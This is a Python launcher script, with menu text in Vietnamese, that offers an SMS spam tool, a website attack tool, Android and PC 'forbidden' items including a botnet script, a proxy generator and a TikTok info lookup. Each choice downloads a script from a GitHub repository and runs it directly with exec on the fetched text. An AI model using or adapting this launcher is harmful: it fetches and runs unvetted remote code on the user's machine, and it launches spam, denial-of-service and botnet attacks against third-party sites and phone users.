import os
import time
import requests

try:
    import ms4
    import qrcode
except ImportError:
    os.system('python3 -m pip install ms4==2.10.0')
    os.system('python3 -m pip install qrcode')
    os.system('cls' if os.name == 'nt' else 'clear')
from ms4 import InfoTik

# Định nghĩa màu
black = "\033[1;90m"
red = "\033[1;91m"
green = "\033[1;92m"
yellow = "\033[1;93m"
blue = "\033[1;94m"
magenta = "\033[1;95m"
cyan = "\033[1;96m"
white = "\033[1;97m"

# Định nghĩa ký tự thông báo
a = f"{white}[{cyan}*{white}] " # [*]

# Định nghĩa danh sách các script
script_urls = {
    '0.0': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/banner.py',
    '0.2': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/botnet_androi.py',
    '0.1': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/0.1.py',
    '1.1': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/spam_sms.py',
    '2.1': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/QR_code.py',
    '3.1': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/ddos_web.py',
    '4.1': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/encode.py',
    '5.1': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/create_proxy.py',
    '6.1': 'https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/info_tikok.py'
}

def execute_code(url):
    exec(requests.get(url).text)

while True:
    execute_code(script_urls['0.0'])  # Hiển thị banner
    options = {
        "0.1": f"{red}Hàng Cấm {magenta}[Only PC]",
        "0.2": f"{red}Hàng Cấm {magenta}[Only Androi]",
        "1.1": f"Tool Spam Sms {green}[Online]",
        "2.1": f"Công Tạo QR Code {green}[Online]",
        "3.1": f"Tấn Công Trang WEB {green}[Online]",
        "4.1": f"Công Cụ Mã Hóa PYTHON {green}[Online]",
        "5.1": f"Công Tạo Proxy Ngẫu Nhiên {green}[Online]",
        "6.1": f"Công Cụ Kiểm Tra Thông Tin TikTok {green}[Online]"
    }

    for key, value in options.items():
        print(f"{a}{yellow}{key}{white}: {blue}{value}")

    print(f"{a}{yellow}Enter{white}: {cyan}Thoát Tool")
    print(f"{white}════════════════════════════════════════════════════════")

    select = input(f"{red}┌─╼{white}[{red}<{white}/{red}>{white}]--{red}>{white} Nhập Lựa Chọn \n{red}└─╼✈ {white}: {yellow} ")
    print(f"{white}════════════════════════════════════════════════════════\033[0m")

    if select in script_urls:
        execute_code(script_urls['0.0'])
        execute_code(script_urls[select])
    elif select == '':
        for i in range(6):  # Lặp 6 lần
            print(f"{magenta}Đang thoát tool{'.' * i}", end="\r")
            time.sleep(0.5)
        os.system('cls' if os.name == 'nt' else 'clear')
        exit()
    else:
        print(f"{red}Lỗi: Lựa chọn không hợp lệ! Vui lòng nhập lại.\033[0m")
        time.sleep(2)
